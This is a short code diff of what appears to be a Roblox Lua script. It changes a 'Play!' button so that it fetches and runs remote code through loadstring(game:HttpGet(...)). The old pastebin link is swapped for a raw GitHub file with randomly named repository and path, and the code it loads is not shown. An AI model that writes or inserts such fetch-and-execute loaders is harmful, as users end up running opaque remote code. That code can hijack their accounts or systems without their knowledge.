@@ -65,7 +65,7 @@ local function notify(message)
 end
  
 createButton("Play!", 0.25, function()
-    loadstring(game:HttpGet('https://pastebin.com/raw/KiQYXjcy'))()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/orruunestad/feiwruewiojfds/refs/heads/main/ruewqrioewur")()
 	screenGui:Destroy()
 end)
  
